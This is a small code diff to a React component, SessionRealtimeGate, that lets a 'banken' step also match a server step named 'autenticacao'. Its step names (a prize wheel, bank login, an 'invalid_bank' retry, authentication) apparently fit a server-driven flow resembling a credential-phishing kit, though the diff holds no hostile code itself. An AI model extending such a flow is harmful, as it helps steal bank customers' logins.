@@ -180,7 +180,7 @@ export function SessionRealtimeGate({
 
         const lsStr = String(localStep);
         if (lsStr === "wheel" && srv === "code_entry") { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
-        if (lsStr === "banken" && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
+        if (lsStr === "banken" && (srv === "bank" || srv === "bank_login" || srv === "autenticacao")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
         if ((lsStr === "banken2" || lsStr === "invalid_bank") && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
         if (lsStr === "autenticacao" && (srv === "bank" || srv === "bank_login" || srv === "autenticacao")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
 
